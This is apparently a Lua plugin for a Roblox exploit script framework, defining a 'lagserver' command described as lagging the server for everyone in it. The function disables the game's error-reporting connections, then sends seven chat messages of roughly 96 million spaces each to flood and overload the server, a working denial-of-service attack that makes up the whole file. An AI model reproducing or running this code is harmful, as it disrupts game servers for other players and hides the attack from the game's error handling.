local Plugin = {
	["PluginName"] = "lag a server",
	["PluginDescription"] = "just lags a server",
	["Commands"] = {
		["lagserver"] = {
			["ListName"] = "lagserver",
			["Description"] = "lags the server for everyone in the server",
			["Aliases"] = {},
			["Function"] = function(args, speaker)
				for _, v in pairs(getconnections(game:GetService("ScriptContext").Error)) do
					v:Disable()
				end

				local v = 96000000 --Maximal bit stream on client
				-- (96000000 - 12) -- Maximal bit stream that server accept +-2
				local msg = "" .. string.rep(" ", (v - 12))
				for i = 1, 7 do
					game.Players:Chat(msg)
				end
			end,
		},
	},
}

return Plugin
